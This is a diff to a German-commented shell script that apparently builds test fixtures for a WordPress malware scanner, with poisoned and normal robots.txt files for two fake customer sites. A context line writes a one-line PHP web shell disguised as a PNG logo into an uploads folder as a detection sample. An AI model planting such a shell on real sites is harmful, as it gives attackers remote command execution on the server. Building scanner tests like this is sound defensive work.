@@ -439,6 +439,17 @@ PHP
   # Als Nicht-PHP getarnte Nutzlast.
   printf '\x89PNG\r\n\x1a\n<?php system($_GET["x"]); ?>\n' \
     > "${k2}/wp-content/uploads/2026/03/logo.png"
+  # ── robots.txt: vergiftet und legitim ────────────────────────────────
+  # Kunde 2 traegt die Kampagnen-Fassung aus dem echten Befall: die Sitemap
+  # zeigt ueber index.php/ auf einen Pfad, zu dem es keine Datei gibt — der
+  # Generator sitzt in der Datenbank.
+  #
+  # Kunde 3 ist die GEGENPROBE und der eigentliche Test: eine voellig normale
+  # robots.txt mit der virtuellen Sitemap, die WordPress seit 5.5 selbst
+  # ausliefert. Schlaegt die Regel dort an, meldet sie jede gepflegte Seite —
+  # dann ist sie wertlos.
+  printf 'User-agent: *\nDisallow: /wp-admin/\nSitemap: https://kunde-zwei.example/index.php/sitemap.xml\n' \
+    > "${k2}/robots.txt"
   # Bewegtbild-Endungen — die Luecke aus dem echten Befall vom 12.08.2026.
   #
   # Dort lagen 32 getarnte Nutzlasten, 7.13 fand 17. Die fehlenden 15 hiessen
@@ -814,6 +825,11 @@ PHP
 
   # Kunde 3 ist die Gegenprobe: alles aktuell, nichts darf gemeldet werden.
   wp_kern "$k3" 6.9.2
+  # Gegenprobe zur vergifteten robots.txt bei Kunde 2 (#47): eine voellig
+  # normale, mit der VIRTUELLEN Sitemap, die WordPress seit 5.5 selbst
+  # ausliefert. Schlaegt die Regel hier an, meldet sie jede gepflegte Seite.
+  printf 'User-agent: *\nDisallow: /wp-admin/\nSitemap: https://kunde-drei.example/wp-sitemap.xml\n' \
+    > "${k3}/robots.txt"
 
   # ── Das Abnahmekriterium fuer Abschnitt 13d ──────────────────────────
   #
